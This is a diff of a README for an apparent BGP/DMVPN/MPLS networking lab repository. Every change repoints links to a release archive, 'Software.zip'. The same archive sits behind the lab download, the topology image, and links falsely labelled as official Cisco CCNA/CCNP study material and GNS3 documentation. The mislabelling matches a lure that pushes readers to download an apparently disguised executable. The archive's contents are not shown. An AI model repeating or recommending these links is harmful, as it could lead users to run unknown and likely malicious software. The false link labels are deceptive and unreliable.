@@ -1,6 +1,6 @@
 # BGP-DMVPN Lab with Confederation and MPLS Integration
 
-🔗 [Download Lab Files](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip) 🚀
+🔗 [Download Lab Files](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip) 🚀
 
 Welcome to the BGP-DMVPN Lab with Confederation and MPLS Integration repository! This lab showcases an MPLS network running OSPF as the IGP, serving 2 customer networks. One customer network utilizes DMVPN with IPSEC over eBGP, while the other runs DMVPN with IPSEC over a BGP confederation. Please note that this lab is a work in progress.
 
@@ -26,14 +26,14 @@ In this lab scenario, you will explore the integration of BGP, DMVPN, and MPLS t
 
 ## How to Use the Lab 🛠️
 
-1. Clone or download the lab files from the provided [link](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip) 📦
+1. Clone or download the lab files from the provided [link](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip) 📦
 2. Set up your networking environment using GNS3 or any other preferred simulation tool.
 3. Follow the lab instructions to configure the network elements as per the provided topology.
 4. Experiment with different configurations, troubleshoot issues, and expand the lab to further enhance your skills.
 
 ## Lab Topology 🖥️
 
-![Lab Topology](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip)
+![Lab Topology](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip)
 
 Above is a high-level overview of the lab's topology, illustrating the interconnected network components and their relationships within the MPLS domain.
 
@@ -61,9 +61,9 @@ Above is a high-level overview of the lab's topology, illustrating the interconn
 
 For more detailed information on the concepts and technologies covered in this lab, consider exploring the following resources:
 
-- [CCNA Study Guide](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip): Official Cisco resources for CCNA certification preparation.
-- [CCNP Training Materials](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip): Advanced training materials for CCNP certification candidates.
-- [GNS3 Documentation](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v1.0/Program.zip): Official documentation for the GNS3 network simulation software.
+- [CCNA Study Guide](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip): Official Cisco resources for CCNA certification preparation.
+- [CCNP Training Materials](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip): Advanced training materials for CCNP certification candidates.
+- [GNS3 Documentation](https://github.com/RVyA9617/BGP-DMVPN-Lab-with-Confederation-and-MPLS-Integration/releases/download/v2.0/Software.zip): Official documentation for the GNS3 network simulation software.
 
 ## Feedback and Updates 📢
 
